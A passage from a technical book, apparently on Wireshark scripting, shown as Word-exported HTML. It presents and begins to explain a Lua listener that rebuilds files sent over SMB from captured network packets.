New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:122.3000pt;margin-left:238.2500pt;text-indent:-21.6000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if byte == "00" then return "\0"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="margin-top:0.0000pt;margin-right:39.5500pt;margin-left:10.6000pt;text-indent:0.0000pt;text-align:center;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:216.6500pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >return string.char(tonumber(byte,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section373" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >16))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section374" ><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local function SMBFileListener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local oFilter = Listener.new(nil, 'smb')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local oField_smb_file = Field.new('smb.file')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local oField_smb_file_data = Field.new('smb.file_data') local oField_smb_eof = Field.new('smb.end_of_file') local oField_smb_cmd = Field.new('smb.cmd')</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:17.2500pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local oField_smb_len_low = Field.new('smb.data_len_low') local oField_smb_offset = Field.new('smb.file.rw.offset') local oField_smb_response = Field.new('smb.flags.response') local gFiles = {}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:51.1500pt;text-indent:-21.6000pt;text-align:left;line-height:27.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function oFilter.packet(pinfo, tvb) if(oField_smb_cmd()) then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:72.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local cmd = oField_smb_cmd()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:72.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local smb_response = oField_smb_response()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:72.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><a name="_bookmark670" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if(cmd.value == 0xa2 and smb_response.value == true)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section375" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:37.7500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local sFilename = tostring(oField_smb_file()) sFilename = string.gsub(sFilename,"\\", "_") local iFilesize = oField_smb_eof()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:37.7500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >iFilesize = tonumber(tostring(iFilesize)) if(iFilesize &#62; 0) then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section376" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:158.3000pt;margin-left:29.5500pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >gFiles[sFilename] = iFilesize end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if(cmd.value == 0x2e and smb_response.value == true)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:37.8000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local sFilename = tostring(oField_smb_file()) sFilename = string.gsub(sFilename,"\\", "_") local iOffset =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:auto;mso-break-type:section-break'></span>
<div class="Section377" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:79.9500pt;text-indent:-72.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tonumber(tostring(oField_smb_offset())) local file_len_low =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tonumber(tostring(oField_smb_len_low()))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local file = io.open(sFilename,'r+') if(file == nil) then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:129.8000pt;margin-left:115.9000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >file = io.open(sFilename,'w') local tempfile = string.rep("A",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >gFiles[sFilename])</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:223.0500pt;margin-left:115.9000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >file:write(tempfile) file:close()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:143.9000pt;margin-left:94.3000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >file = io.open(sFilename, 'r+') end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if(file_len_low &#62; 0) then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:5.7500pt;margin-left:115.9000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local file_data = tostring(oField_smb_file_data()) file_data = string.gsub(file_data,":", "") file_data = file_data:unhexlify() file:seek("set",iOffset)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:215.8500pt;margin-left:115.9000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >file:write(file_data) file:close()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:367.0500pt;margin-left:72.7500pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.9000pt;margin-right:410.2500pt;margin-left:29.5500pt;text-indent:21.5500pt;text-align:left;line-height:27.0000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:11.6500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function oFilter.draw()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:90.0000pt;margin-left:29.5500pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >printfiles(gFiles) -- list filename and sizes end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:352.5500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >end SMBFileListener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="line-height:15.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The program starts by defining two helper functions used for data</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;line-height:17.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >presentation and converting between data types: </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >printfiles</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:17.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >string.unhexlify(str)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The core functionality is again contained in a listener function,</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
